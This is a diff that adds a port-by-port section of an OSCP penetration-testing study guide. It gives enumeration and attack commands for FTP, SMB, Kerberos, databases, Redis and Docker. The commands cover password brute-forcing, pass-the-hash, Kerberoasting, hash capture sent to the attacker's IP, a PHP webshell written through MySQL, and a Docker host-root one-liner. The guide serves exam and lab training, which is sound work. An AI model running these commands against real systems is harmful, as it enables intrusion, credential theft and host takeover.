+<tr><td>3389</td><td>RDP</td><td>remote desktop (GUI)</td><td>test creds → <code>xfreerdp</code> login</td><td><code class="tag">[ENUM-RDP]</code></td></tr>
+<tr><td>5432</td><td>PostgreSQL</td><td>database</td><td>try <code>postgres</code>/blank; <code>COPY ... PROGRAM</code> → RCE</td><td><code class="tag">[ENUM-POSTGRES]</code></td></tr>
+<tr><td>5900</td><td>VNC</td><td>remote desktop</td><td>auth-bypass / crack the VNC password / connect</td><td><code class="tag">[ENUM-VNC]</code></td></tr>
+<tr><td>5985/5986</td><td>WinRM</td><td>remote PowerShell</td><td><code>nxc winrm</code> creds → <code>evil-winrm</code> <strong>shell</strong></td><td><code class="tag">[ENUM-WINRM]</code></td></tr>
+<tr><td>6379</td><td>Redis</td><td>in-memory DB, <strong>often no auth</strong></td><td>connect; write a webshell / SSH key</td><td><code class="tag">[ENUM-REDIS]</code></td></tr>
+<tr><td>27017</td><td>MongoDB</td><td>NoSQL DB, often no auth</td><td>dump collections → creds/tokens</td><td><code class="tag">[ENUM-MONGODB]</code></td></tr>
+<tr><td>2375/2376</td><td>Docker API</td><td>container engine</td><td>unauth API → <strong>host root</strong></td><td><code class="tag">[ENUM-DOCKER]</code></td></tr>
+</tbody></table></div>
+<p><strong>The instant &quot;tells&quot; — train these gut reactions:</strong></p>
+<ul>
+<li><strong>Port 88 open → it&#x27;s a Domain Controller → go AD</strong> (BloodHound, roasting, spraying).</li>
+<li>**445 with <code>signing:False</code> → NTLM relay is possible** (lab only; poisoning is banned on the exam).</li>
+<li><strong>Anonymous FTP / null SMB / world-readable NFS → free files — loot them first.</strong></li>
+<li><strong>A database port (1433/3306/5432) + a credential → usually the fastest RCE.</strong></li>
+<li>**A version number on ANY service → <code>searchsploit</code> / CVE it immediately** (<code class="tag">[EXPLOIT-RESEARCH]</code>).</li>
+<li>**161 SNMP → <code>snmpwalk</code> is a low-effort credential jackpot** (passwords in process arguments).</li>
+<li><strong>Lots of high ports 49152+ on Windows → normal RPC plumbing, ignore them.</strong></li>
+</ul>
+<p><strong>Golden habit:</strong> the open ports are a <strong>menu, not a checklist in order</strong> — enumerate them all, then attack the *easiest* win first (web, SMB, or a known-version exploit).</p>
+<h2 id="v3-[enum-ftp]-port-21-ftp-file-transfer">[ENUM-FTP]  Port 21 — FTP (file transfer)<a class="anchor" href="#v3-[enum-ftp]-port-21-ftp-file-transfer">#</a></h2>
+<p><strong>What it is:</strong> an old way to upload/download files. It&#x27;s a goldmine when it allows <strong>anonymous</strong> login (username <code>anonymous</code>, any password) — you might read config files, backups, or even the website&#x27;s files. If FTP shares the same folder as the web server, you can sometimes <strong>upload a &quot;webshell&quot;</strong> (a small script that lets you run commands via the browser).</p>
+<pre><code>nmap -p21 -sCV --script ftp-anon $IP          # check the version + whether anonymous login is allowed
+ftp $IP                                        # log in interactively — try user: anonymous, password: (just press Enter)
+wget -r ftp://anonymous:anonymous@$IP/         # download EVERYTHING on the server, recursively, to your machine
+curl ftp://$IP/ --user anonymous:anonymous     # just list the files without logging in interactively
+hydra -l $U -P rockyou.txt ftp://$IP           # guess a password — ONLY if you have a real reason [LOOK-UP]</code></pre>
+<p><strong>What to check / do:</strong></p>
+<ul>
+<li>Got in anonymously? <strong>List and download everything.</strong> Try <code>put testfile</code> — can you upload? If yes *and* it&#x27;s the web root → drop a webshell.</li>
+<li>Loot you want: config files, backups, <code>.txt</code> files with passwords, source code. <strong>Any password you find, try it on every other service</strong> (people reuse passwords — this is &quot;credential spraying/reuse&quot;).</li>
+<li>Downloading a binary and it&#x27;s corrupt? Type <code>binary</code> in the ftp prompt before <code>get</code>.</li>
+</ul>
+<p><strong>Known weak spots:</strong> vsftpd 2.3.4 (has a joke backdoor — opens a root shell on port 6200) · ProFTPD 1.3.5 (<code>mod_copy</code> lets you copy files → write a webshell) · anonymous <strong>write</strong> access.</p>
+<p><strong>Where it leads:</strong> a webshell, credentials, or source code → see <code class="tag">[FOUND-CREDS]</code> (Volume 6) and <code class="tag">[WEB-UPLOAD]</code> (Volume 2).</p>
+<h2 id="v3-[enum-ssh]-port-22-ssh-remote-login-shell">[ENUM-SSH]  Port 22 — SSH (remote login shell)<a class="anchor" href="#v3-[enum-ssh]-port-22-ssh-remote-login-shell">#</a></h2>
+<p><strong>Big idea:</strong> SSH is almost never the way *in* — it&#x27;s the <strong>reward</strong>. You rarely break SSH directly; instead you find a password or a private key *somewhere else* (a file, a share, a database) and then log in with it. Don&#x27;t waste time attacking SSH head-on.</p>
+<pre><code>nmap -p22 -sCV $IP                         # read the version banner (hints at the OS/distro)
+ssh $U@$IP                                 # log in with a username + a password you found
+chmod 600 id_rsa ; ssh -i id_rsa $U@$IP    # log in with a private KEY file (chmod 600 first, or SSH refuses it)
+ssh2john id_rsa &gt; h ; john --wordlist=rockyou.txt h   # key wants a passphrase? crack it (see Volume 3)
+hydra -l $U -P rockyou.txt ssh://$IP       # password-guess as a LAST resort — slow and noisy, needs a known user</code></pre>
+<ul>
+<li>A <strong>private key</strong> (often a file named <code>id_rsa</code>) is like a password-less door key. If you find one, <code>chmod 600</code> it (SSH rejects keys that others could read) then log in with <code>-i</code>.</li>
+<li>Read <code>~/.ssh/authorized_keys</code> and <code>known_hosts</code> on any box you get onto — they leak <strong>other usernames and other target machines</strong>.</li>
+</ul>
+<p><strong>Troubleshoot:</strong></p>
+<ul>
+<li><code>Permission denied (publickey)</code> → wrong key, or wrong username.</li>
+<li><code>no matching key exchange/cipher</code> (very old server) → <code>ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa $U@$IP</code></li>
+</ul>
+<p><strong>Where it leads:</strong> a foothold (your first shell) → <code class="tag">[LINUX-PRIVESC-QUICK]</code> · tunneling through it → <code class="tag">[PIVOT-SSH]</code>.</p>
+<h2 id="v3-[enum-smtp]-ports-25465587-mail-smtp">[ENUM-SMTP]  Ports 25/465/587 — Mail (SMTP)<a class="anchor" href="#v3-[enum-smtp]-ports-25465587-mail-smtp">#</a></h2>
+<p><strong>What it is:</strong> the mail-sending service. For OSCP its main use is <strong>finding valid usernames</strong> — you ask the mail server &quot;does user X exist?&quot; and it tells you. Those usernames feed Active Directory attacks later.</p>
+<pre><code>nmap -p25 -sCV --script &quot;smtp-commands,smtp-enum-users&quot; $IP   # server capabilities + user-guessing
+smtp-user-enum -M RCPT -U users.txt -t $IP    # check a list of names against the server [LOOK-UP]
+nc $IP 25                                      # talk to it by hand: type  VRFY root  or  RCPT TO:&lt;user&gt;</code></pre>
+<p><strong>What to check:</strong> the banner may leak the mail software and an internal hostname. Valid users → feed them into AD spraying/roasting (<code class="tag">[AD-QUICK]</code>).</p>
+<h2 id="v3-[enum-dns]-port-53-dns-name-lookups-also-[tech-dns]">[ENUM-DNS]  Port 53 — DNS (name lookups)  → also <code class="tag">[TECH-DNS]</code><a class="anchor" href="#v3-[enum-dns]-port-53-dns-name-lookups-also-[tech-dns]">#</a></h2>
+<p><strong>What it is:</strong> the phone book that turns names (<code>server.corp.local</code>) into IPs. The jackpot here is a <strong>zone transfer</strong> — if misconfigured, the server hands you a full list of every internal hostname at once. On Active Directory, DNS also reveals the Domain Controllers.</p>
+<pre><code>dig axfr @$IP &lt;domain&gt;                     # ZONE TRANSFER — dumps ALL records at once (the big win)
+dig any @$IP &lt;domain&gt;                       # ask for any records it&#x27;ll share
+dig -x $IP @$IP                             # reverse lookup (IP → name)
+dnsrecon -d internal.lan -a -n $IP          # automated enumeration (includes the zone-transfer attempt)
+dnsrecon -d &lt;domain&gt; -D wordlist.txt -t brute   # guess subdomain names from a wordlist
+nslookup -type=SRV _ldap._tcp.&lt;domain&gt; $IP  # AD trick: locate Domain Controllers via SRV records</code></pre>
+<p><strong>What to check / do:</strong> **every hostname you discover, add it to your <code>/etc/hosts</code>** file (<code>sudo nano /etc/hosts</code>, add a line <code>&lt;IP&gt;  server.corp.local</code>) so your tools can reach it by name.</p>
+<p><strong>Where it leads:</strong> new website names to fuzz (<code class="tag">[WEB-CONTENT]</code>) · identifying the DC (<code class="tag">[AD-ENUM]</code>).</p>
+<h2 id="v3-[enum-http]-https-ports-80443808080008443-web">[ENUM-HTTP] / HTTPS  Ports 80/443/8080/8000/8443/… — Web<a class="anchor" href="#v3-[enum-http]-https-ports-80443808080008443-web">#</a></h2>
+<p><strong>What it is:</strong> a website. This is the <strong>#1 way into most boxes.</strong> Enumerate <strong>every</strong> HTTP port thoroughly — the full method is Volume 2 (<code>[WEB-*]</code>). Quick first look:</p>
+<pre><code>whatweb http://$IP        # identify the tech stack (server, CMS, frameworks)
+curl -sI http://$IP       # show just the response headers (server type, redirects, cookies)
+# then: view page source · read /robots.txt · brute-force hidden directories · brute-force vhosts</code></pre>
+<p><strong>Look for:</strong> the CMS and its version (→ search for exploits), any redirect to a hostname (add it to <code>/etc/hosts</code>, then fuzz it as a &quot;vhost&quot;), login pages, file-upload pages, and URL parameters (<code>?id=1</code>) to test for injection.</p>
+<p><strong>Where it leads:</strong> SQL injection / file inclusion / file upload / command injection / a known-version exploit → your first shell. **Start at <code class="tag">[WEB-QUICK]</code> in Volume 2.**</p>
+<h2 id="v3-[enum-smb]-ports-139445-smb-windows-file-sharing-also-[tech-smb]">[ENUM-SMB]  Ports 139/445 — SMB (Windows file sharing)  → also <code class="tag">[TECH-SMB]</code><a class="anchor" href="#v3-[enum-smb]-ports-139445-smb-windows-file-sharing-also-[tech-smb]">#</a></h2>
+<p><strong>What it is:</strong> Windows file-and-printer sharing. On a Windows/AD network it&#x27;s the workhorse: you can sometimes list shared folders and usernames <strong>without any password</strong> (&quot;null session&quot;), test whether creds work, move between machines, and loot files left in shares.</p>
+<h3 id="v3-[smb-quick]-first-look-one-screen">[SMB-QUICK]  first look  (one screen)<a class="anchor" href="#v3-[smb-quick]-first-look-one-screen">#</a></h3>
+<pre><code>nxc smb $IP                              # basic info: OS, hostname, domain, signing   [MUST-MEMORIZE]
+nxc smb $IP -u &#x27;&#x27; -p &#x27;&#x27; --shares         # try to list shared folders with NO credentials (null session)
+nxc smb $IP -u &#x27;guest&#x27; -p &#x27;&#x27; --shares    # fallback: try the &quot;guest&quot; account
+enum4linux-ng -A $IP                     # throw everything at it automatically (users, shares, policy)
+smbclient -N -L //$IP/                   # another way to list shares with no creds (-N = no password)
+smbclient -N //$IP/&lt;share&gt;               # connect INTO a share; then use: ls, get &lt;file&gt;, recurse ON</code></pre>
+<blockquote>**What is <code>nxc</code>?** <code>nxc</code> (NetExec, formerly CrackMapExec/<code>cme</code>) is a Swiss-army knife for Windows protocols (SMB, WinRM, LDAP, MSSQL…). You&#x27;ll use it constantly. <code>smbclient</code> is a simpler one-share file browser.</blockquote>
+<p><strong>Look for:</strong> <code>signing:False</code> (means NTLM-relay attacks are possible), folders you can <strong>read</strong> or <strong>write</strong>, usernames, and the domain name. <strong>Next:</strong> read every readable share; try any found password on other accounts.</p>
+<h3 id="v3-[smb-enum]-deeper-enumeration">[SMB-ENUM]  deeper enumeration<a class="anchor" href="#v3-[smb-enum]-deeper-enumeration">#</a></h3>
+<pre><code>nxc smb $IP -u &#x27;&#x27; -p &#x27;&#x27; --shares --users     # null session: list shares AND users
+nxc smb $IP -u guest -p &#x27;&#x27; --shares          # guest fallback
+nxc smb $IP -u &#x27;&#x27; -p &#x27;&#x27; --rid-brute          # pull usernames by cycling ID numbers (works with no creds)
+smbclient -N //$IP/Share                      # browse a share; inside: &#x27;recurse ON&#x27;, &#x27;prompt OFF&#x27;, then &#x27;mget *&#x27;
+mount -t cifs //$IP/Share /mnt/s -o username=$U,password=$P   # mount a share locally so you can grep it [LOOK-UP]
+nxc smb $IP -u $U -p $P --shares --users --pass-pol --groups  # with creds: full enumeration
+nxc smb &lt;hosts.txt&gt; -u users.txt -p &#x27;Password1&#x27; --continue-on-success   # spray ONE password at many users/hosts
+nxc smb $IP -u $U -H &lt;ntlmhash&gt;              # log in with a HASH instead of a password (&quot;pass-the-hash&quot;)
+nmap --script smb-vuln-ms17-010 -p445 $IP   # check for EternalBlue (old, unpatched Windows)</code></pre>
+<blockquote><strong>&quot;Spraying&quot;</strong> = trying one likely password against many usernames (safer than hammering one user, which can lock the account). <strong>&quot;Pass-the-hash&quot;</strong> = Windows lets you authenticate with the password&#x27;s *hash* (a scrambled fingerprint) even if you never cracked the actual password.</blockquote>
+<p><strong>Files worth grabbing from shares:</strong> <code>Groups.xml</code> / GPP files (contain an encrypted-but-crackable <code>cpassword</code>), login scripts, <code>web.config</code>, <code>unattend.xml</code>, backups, <code>.kdbx</code> (KeePass), <code>.ps1</code> scripts, sticky-notes.</p>
+<p><strong>Common misconfigs:</strong> null/guest read access · a <strong>writable</strong> share (drop a <code>.scf</code>/<code>.lnk</code> file to steal a hash) · SMB signing off (relay attacks).</p>
+<p><strong>Known vulns:</strong> MS17-010 &quot;EternalBlue&quot; (old boxes) · GPP <code>cpassword</code>.</p>
+<h3 id="v3-[smb-attack]-turning-smb-access-into-a-shell">[SMB-ATTACK]  turning SMB access into a shell<a class="anchor" href="#v3-[smb-attack]-turning-smb-access-into-a-shell">#</a></h3>
+<pre><code>impacket-psexec $U:$P@$IP        # get a SYSTEM shell using ADMIN creds — reliable but &quot;loud&quot;
+impacket-wmiexec $U:$P@$IP       # run commands more quietly (no service created)
+nxc smb $IP -u $U -p $P -x whoami   # run a single command and see the output
+# writable share → drop a malicious .scf/.url/.lnk, run Responder/ntlmrelayx to catch the hash [LOOK-UP]</code></pre>
+<p>See <code class="tag">[AD-LATERAL]</code> (Volume 5) for the full &quot;move to another machine&quot; menu.</p>
+<h3 id="v3-[smb-troubleshooting]">[SMB-TROUBLESHOOTING]<a class="anchor" href="#v3-[smb-troubleshooting]">#</a></h3>
+<div class="tablewrap"><table><thead><tr><th>What you see</th><th>Meaning / fix</th></tr></thead><tbody>
+<tr><td><code>NT_STATUS_ACCESS_DENIED</code> when listing</td><td>null session is disabled → you need real creds</td></tr>
+<tr><td><code>STATUS_LOGON_FAILURE</code></td><td>wrong creds — check the domain: add <code>-d DOMAIN</code> or use <code>-u DOMAIN/user</code></td></tr>
+<tr><td><code>STATUS_ACCOUNT_RESTRICTION</code></td><td>that account isn&#x27;t allowed to use SMB / only on certain hosts</td></tr>
+<tr><td>smbclient: &quot;protocol negotiation failed&quot;</td><td>ancient SMBv1 → <code>smbclient --option=&#x27;client min protocol=NT1&#x27;</code></td></tr>
+<tr><td><code>STATUS_NOT_SUPPORTED</code></td><td>SMBv1 disabled (fine) → use nxc / SMB2</td></tr>
+<tr><td>Kerberos &quot;clock skew&quot; errors</td><td>your clock differs from the DC → <code>sudo ntpdate $IP</code></td></tr>
+</tbody></table></div>
+<p><strong>Where it leads:</strong> creds, loot, moving laterally, and full AD enumeration → <code class="tag">[FOUND-SMB]</code>, spray creds, <code class="tag">[AD-ENUM]</code>.</p>
+<h2 id="v3-[enum-rpc]-port-135-windows-rpc-port-111-unix-rpc">[ENUM-RPC]  Port 135 (Windows RPC) / Port 111 (Unix RPC)<a class="anchor" href="#v3-[enum-rpc]-port-135-windows-rpc-port-111-unix-rpc">#</a></h2>
+<p><strong>What it is:</strong> 135 is a Windows service that can leak <strong>users and domain info</strong> (sometimes when SMB won&#x27;t). 111 is the Unix &quot;portmapper&quot; that points you to <strong>NFS</strong> file shares.</p>
+<pre><code>rpcclient -U &#x27;&#x27; -N $IP     # connect with no creds; then type: enumdomusers / enumdomgroups / queryuser 0x&lt;rid&gt; / srvinfo
+impacket-rpcdump $IP       # list the available RPC services
+rpcinfo -p $IP             # Unix side (111): what RPC services exist
+showmount -e $IP           # Unix side: list NFS exports (shared folders)</code></pre>
+<p><strong>Where it leads:</strong> usernames (→ spray/roast), NFS shares to mount.</p>
+<h2 id="v3-[enum-ldap]-ports-38963632683269-ldap-the-ad-directory-[ad-enum]-[tech-ldap]">[ENUM-LDAP]  Ports 389/636/3268/3269 — LDAP (the AD directory)  → <code class="tag">[AD-ENUM]</code>, <code class="tag">[TECH-LDAP]</code><a class="anchor" href="#v3-[enum-ldap]-ports-38963632683269-ldap-the-ad-directory-[ad-enum]-[tech-ldap]">#</a></h2>
+<p><strong>What it is:</strong> the Active Directory database, queried over the network. An &quot;anonymous bind&quot; (no login) can sometimes dump all users, computers, and their <strong>descriptions</strong> — and admins sometimes stash <strong>passwords in the description field</strong>.</p>
+<pre><code>ldapsearch -x -H ldap://$IP -s base namingcontexts     # find the &quot;base DN&quot; (e.g. dc=corp,dc=local) — you need this
+ldapsearch -x -H ldap://$IP -b &quot;dc=corp,dc=local&quot;      # anonymous dump: users, descriptions (creds!), computers
+ldapsearch -x -H ldap://$IP -D &#x27;$U@corp.local&#x27; -w &#x27;$P&#x27; -b &quot;dc=corp,dc=local&quot; &quot;(objectClass=user)&quot; sAMAccountName description   # with creds
+nxc ldap $IP -u $U -p $P --users --groups --asreproast asrep.txt --kerberoasting kerb.txt   # users + build roast target lists
+ldapdomaindump -u &#x27;corp.local\$U&#x27; -p $P $IP            # dump everything to browsable HTML/JSON</code></pre>
+<blockquote><code>-x</code> = simple auth, <code>-H</code> = the server URL, <code>-b</code> = the &quot;base DN&quot; (where in the tree to start — get it from the first command). The <strong>base DN</strong> is just the directory&#x27;s root path, written like <code>dc=corp,dc=local</code> for the domain <code>corp.local</code>.</blockquote>
+<p><strong>Where it leads:</strong> full AD enumeration, passwords in descriptions, Kerberoast/AS-REP target lists, and data to feed BloodHound (<code class="tag">[AD-BLOODHOUND]</code>).</p>
+<h2 id="v3-[enum-kerberos]-port-88-kerberos-ad-login-system-[ad-kerberoast]-[ad-asrep]">[ENUM-KERBEROS]  Port 88 — Kerberos (AD login system)  → <code class="tag">[AD-KERBEROAST]</code>, <code class="tag">[AD-ASREP]</code><a class="anchor" href="#v3-[enum-kerberos]-port-88-kerberos-ad-login-system-[ad-kerberoast]-[ad-asrep]">#</a></h2>
+<p><strong>What it is:</strong> the authentication system Active Directory uses. <strong>The moment you see port 88 open, this machine is a Domain Controller — switch your whole mindset to &quot;this is AD.&quot;</strong></p>
+<pre><code>sudo ntpdate $IP     # FIRST fix the clock (Kerberos fails if your clock differs from the DC&#x27;s)
+impacket-GetNPUsers &lt;domain&gt;/ -no-pass -usersfile users.txt -dc-ip $IP   # AS-REP roast: grab crackable hashes with NO creds
+impacket-GetUserSPNs -request &lt;domain&gt;/$U:$P -dc-ip $IP                   # Kerberoast: grab crackable hashes with ANY one cred</code></pre>
+<blockquote><strong>AS-REP roasting</strong> = some accounts are misconfigured so anyone can request a chunk of crackable data (a &quot;hash&quot;) for them, no login needed. <strong>Kerberoasting</strong> = with *any* valid account you can request crackable hashes for service accounts. Both hashes get cracked offline in Volume 3.</blockquote>
+<p><strong>Where it leads:</strong> crackable hashes → passwords, and confirmed usernames → <code class="tag">[AD-QUICK]</code>.</p>
+<h2 id="v3-[enum-winrm]-ports-59855986-winrm-remote-powershell-[tech-winrm]">[ENUM-WINRM]  Ports 5985/5986 — WinRM (remote PowerShell)  → <code class="tag">[TECH-WINRM]</code><a class="anchor" href="#v3-[enum-winrm]-ports-59855986-winrm-remote-powershell-[tech-winrm]">#</a></h2>
+<p><strong>What it is:</strong> remote PowerShell access — <strong>if</strong> your account is in the &quot;Remote Management Users&quot; or Administrators group. Once you have working creds, this is a prime way to get an interactive Windows shell.</p>
+<pre><code>nxc winrm $IP -u $U -p $P     # test the creds — if it prints &quot;(Pwn3d!)&quot; you CAN get a shell
+evil-winrm -i $IP -u $U -p $P # get the interactive shell (has built-in &#x27;upload&#x27; and &#x27;download&#x27; commands)
+evil-winrm -i $IP -u $U -H &lt;ntlmhash&gt;   # log in with a hash instead of a password</code></pre>
+<blockquote><code>(Pwn3d!)</code> in nxc output = &quot;these creds are strong enough to execute here&quot; — a green light.</blockquote>
+<p><strong>Troubleshoot:</strong> nxc validates but evil-winrm fails → the user isn&#x27;t allowed WinRM. TLS on port 5986 → add <code>-S</code>. Kerberos time errors → <code>ntpdate</code>.</p>
+<p><strong>Where it leads:</strong> an interactive Windows foothold → <code class="tag">[WINDOWS-PRIVESC-QUICK]</code>.</p>
+<h2 id="v3-[enum-rdp]-port-3389-rdp-remote-desktop-the-gui-[tech-rdp]">[ENUM-RDP]  Port 3389 — RDP (Remote Desktop, the GUI)  → <code class="tag">[TECH-RDP]</code><a class="anchor" href="#v3-[enum-rdp]-port-3389-rdp-remote-desktop-the-gui-[tech-rdp]">#</a></h2>
+<p><strong>What it is:</strong> full graphical remote desktop. With valid creds you get a Windows desktop; very old versions have the risky &quot;BlueKeep&quot; exploit (rarely needed).</p>
+<pre><code>nxc rdp $IP -u $U -p $P                                       # test whether the creds work for RDP
+xfreerdp /v:$IP /u:$U /p:$P +clipboard /dynamic-resolution    # connect to the desktop   [MUST-RECOGNIZE]
+xfreerdp /v:$IP /u:$U /pth:&lt;ntlmhash&gt;                         # pass-the-hash (needs &quot;Restricted Admin&quot; mode)
+xfreerdp /v:$IP /u:$U /p:$P /drive:share,/tmp                 # share your /tmp into the session to move files</code></pre>
+<p><strong>Where it leads:</strong> a graphical foothold — handy for running winPEAS visually or moving files via clipboard/mapped drive.</p>
+<h2 id="v3-[enum-snmp]-port-161udp-snmp-device-monitoring-[tech-snmp]">[ENUM-SNMP]  Port 161/UDP — SNMP (device monitoring)  → <code class="tag">[TECH-SNMP]</code><a class="anchor" href="#v3-[enum-snmp]-port-161udp-snmp-device-monitoring-[tech-snmp]">#</a></h2>
+<p><strong>What it is:</strong> a monitoring protocol. If the &quot;community string&quot; (a shared password) is the default <code>public</code>, it happily dumps <strong>running process command-lines (which often contain passwords!), user lists, installed software, and open ports.</strong> High reward, low effort — don&#x27;t skip it.</p>
+<pre><code>snmpwalk -v2c -c public $IP     # dump everything the device will share
+snmp-check $IP -c public        # same data, formatted more nicely
+onesixtyone -c common.txt $IP   # guess the community string if &#x27;public&#x27; doesn&#x27;t work
+# useful OIDs (an OID is an &quot;address&quot; for a specific piece of data) [LOOK-UP]:
+#   processes:      1.3.6.1.2.1.25.4.2.1.2
+#   process args:   1.3.6.1.2.1.25.4.2.1.5   ← passwords often hide here
+#   installed sw:   1.3.6.1.2.1.25.6.3.1.2
+#   user accounts:  1.3.6.1.4.1.77.1.2.25</code></pre>
+<p><strong>Where it leads:</strong> passwords in process arguments, usernames, internal software/ports.</p>
+<h2 id="v3-[enum-nfs]-port-2049-111-nfs-unix-file-sharing-[tech-nfs]">[ENUM-NFS]  Port 2049 (+111) — NFS (Unix file sharing)  → <code class="tag">[TECH-NFS]</code><a class="anchor" href="#v3-[enum-nfs]-port-2049-111-nfs-unix-file-sharing-[tech-nfs]">#</a></h2>
+<p><strong>What it is:</strong> the Unix version of SMB. Shared folders (&quot;exports&quot;) may be world-readable/writable, and a setting called **<code>no_root_squash</code>** can hand you root.</p>
+<pre><code>showmount -e $IP                              # list the shared folders (exports)
+mount -t nfs $IP:/export /mnt/nfs -o nolock   # mount one locally so you can read it (creds, keys, source)</code></pre>
+<p><strong>What to check / do:</strong></p>
+<ul>
+<li>Is <code>no_root_squash</code> set? Then on <strong>your</strong> machine (as root) drop a special &quot;SUID root&quot; program into the mounted folder; running it on the target as a low-priv user gives you <strong>root</strong> (full steps in <code class="tag">[LINUX-PRIVESC]</code>, NFS section).</li>
+<li>Files show wrong owner / you can&#x27;t read them? Create a local user with the <strong>same UID number</strong> as the file&#x27;s owner.</li>
+</ul>
+<p><strong>Where it leads:</strong> creds/keys, or root via the SUID trick.</p>
+<h2 id="v3-[enum-mssql]-port-1433-microsoft-sql-server-[sqli-mssql]-[tech-sql]">[ENUM-MSSQL]  Port 1433 — Microsoft SQL Server  → <code class="tag">[SQLI-MSSQL]</code>, <code class="tag">[TECH-SQL]</code><a class="anchor" href="#v3-[enum-mssql]-port-1433-microsoft-sql-server-[sqli-mssql]-[tech-sql]">#</a></h2>
+<p><strong>What it is:</strong> Microsoft&#x27;s database. With creds you can often run OS commands (<code>xp_cmdshell</code>), steal/relay Windows hashes, or impersonate the <code>sa</code> (admin) account.</p>
+<pre><code>nxc mssql $IP -u $U -p $P                        # test the creds
+impacket-mssqlclient $U:$P@$IP -windows-auth     # connect; then, INSIDE the client prompt:
+#   enable_xp_cmdshell                            #   turn on command execution
+#   xp_cmdshell &#x27;whoami&#x27;                          #   run an OS command (needs sysadmin/impersonation)
+#   EXEC xp_dirtree &#x27;\\&lt;yourKaliIP&gt;\x&#x27;            #   force it to auth to YOU → catch the hash on Responder
+#   EXEC AS LOGIN=&#x27;sa&#x27;                            #   become &#x27;sa&#x27; if impersonation is allowed
+#   SELECT * FROM master..sysservers              #   list &quot;linked servers&quot; → hop to another DB/host</code></pre>
+<p><strong>Where it leads:</strong> command execution as the SQL service account (often has SeImpersonate → SYSTEM), hash capture, or lateral movement via linked servers.</p>
+<h2 id="v3-[enum-mysql]-port-3306-mysql-[sqli-mysql]">[ENUM-MYSQL]  Port 3306 — MySQL  → <code class="tag">[SQLI-MYSQL]</code><a class="anchor" href="#v3-[enum-mysql]-port-3306-mysql-[sqli-mysql]">#</a></h2>
+<pre><code>mysql -h $IP -u root -p                # try passwords: blank, &#x27;root&#x27;, &#x27;toor&#x27;
+nmap -p3306 --script mysql-empty-password,mysql-info $IP   # check for a blank root password
+#   once inside:  show databases;  use &lt;db&gt;;  show tables;  select * from users;   → app creds/hashes
+#   if the account has FILE privilege:
+#     SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;);                              # read a file off the server
+#     SELECT &#x27;&lt;?php system($_GET[c]); ?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/sh.php&#x27;;   # write a webshell</code></pre>
+<p><strong>Where it leads:</strong> application creds/hashes (→ spray) and file read/write (→ webshell). UDF RCE if the plugin dir is writable <code class="tag">[LOOK-UP]</code>.</p>
+<h2 id="v3-[enum-postgres]-port-5432-postgresql-[sqli-postgres]">[ENUM-POSTGRES]  Port 5432 — PostgreSQL  → <code class="tag">[SQLI-POSTGRES]</code><a class="anchor" href="#v3-[enum-postgres]-port-5432-postgresql-[sqli-postgres]">#</a></h2>
+<pre><code>psql -h $IP -U postgres      # try password: &#x27;postgres&#x27; or blank
+nxc postgres $IP -u $U -p $P # test creds
+#   command execution (superuser, v9.3+):  COPY t FROM PROGRAM &#x27;id&#x27;;
+#   read a file:                           COPY t FROM &#x27;/etc/passwd&#x27;;    [LOOK-UP]</code></pre>
+<p><strong>Where it leads:</strong> command execution as the postgres user, file read.</p>
+<h2 id="v3-[enum-redis]-port-6379-redis-in-memory-database">[ENUM-REDIS]  Port 6379 — Redis (in-memory database)<a class="anchor" href="#v3-[enum-redis]-port-6379-redis-in-memory-database">#</a></h2>
+<p><strong>What it is:</strong> a fast key-value store that is <strong>frequently left with no password.</strong> If so, you can often write files to disk → drop a webshell, an SSH key, or a cron job.</p>
+<pre><code>redis-cli -h $IP        # connect; then type: info ; config get dir ; keys *
+#   no-auth file write trick: set &#x27;dir&#x27; + &#x27;dbfilename&#x27; to the web root or ~/.ssh, then save
+#     → writes a webshell or an authorized_keys file
+#   MODULE LOAD → full command execution on some versions [LOOK-UP]</code></pre>
+<p><strong>Where it leads:</strong> file write → foothold; stored data (session tokens, creds).</p>
+<h2 id="v3-[enum-mongodb]-port-27017-mongodb">[ENUM-MONGODB]  Port 27017 — MongoDB<a class="anchor" href="#v3-[enum-mongodb]-port-27017-mongodb">#</a></h2>
+<pre><code>mongosh --host $IP        # or the older:  mongo $IP
+#   show dbs ;  use &lt;db&gt; ;  show collections ;  db.users.find()    → dump app users/hashes/tokens (often no auth)</code></pre>
+<p><strong>Where it leads:</strong> creds/tokens for the application.</p>
+<h2 id="v3-[enum-git]-an-exposed-git-folder-over-http-[found-git]">[ENUM-GIT]  an exposed <code>.git</code> folder over HTTP  → <code class="tag">[FOUND-GIT]</code><a class="anchor" href="#v3-[enum-git]-an-exposed-git-folder-over-http-[found-git]">#</a></h2>
+<p><strong>What it is:</strong> source code + its full history. Repos often contain <strong>hard-coded passwords, API keys, and endpoints</strong> — sometimes in files that were &quot;deleted&quot; but still live in history.</p>
+<pre><code>git-dumper http://$IP/.git ./loot                  # download the whole exposed repo [LOOK-UP] (or: wget -r)
+git log -p | grep -iE &#x27;pass|secret|key|token&#x27;       # search the ENTIRE history for secrets
+git show ; git stash list                           # look at deleted / stashed content</code></pre>
+<p><strong>Where it leads:</strong> creds, source to find bugs in, config files with DB/API keys.</p>
+<h2 id="v3-[enum-docker]-ports-23752376-or-a-container-you-land-inside">[ENUM-DOCKER]  Ports 2375/2376, or a container you land inside<a class="anchor" href="#v3-[enum-docker]-ports-23752376-or-a-container-you-land-inside">#</a></h2>
+<pre><code>docker -H tcp://$IP:2375 ps                                          # is the Docker API exposed with no auth?
+docker -H tcp://$IP:2375 run -v /:/host -it alpine chroot /host sh   # if yes → mount the host&#x27;s disk = host root
+# if you&#x27;re INSIDE a container: check /.dockerenv, your capabilities, mounted host paths, and /var/run/docker.sock → escape</code></pre>
+<p><strong>Where it leads:</strong> taking over the host from a container (see <code class="tag">[LINUX-PRIVESC]</code>, Docker/LXD).</p>
+<h2 id="v3-[enum-oracle]-port-1521-oracle-database-tns">[ENUM-ORACLE]  Port 1521 — Oracle Database (TNS)<a class="anchor" href="#v3-[enum-oracle]-port-1521-oracle-database-tns">#</a></h2>
+<p><strong>What it is:</strong> an Oracle database. It&#x27;s fiddly and has its own tools. The way in is usually: find a valid <strong>SID</strong> (the database&#x27;s name), then log in with <strong>default creds</strong> (<code>scott/tiger</code>, <code>system/manager</code>, <code>sys/change_on_install</code>), then get command execution.</p>
+<pre><code>sudo apt install oracle-instantclient  # if sqlplus/odat aren&#x27;t installed
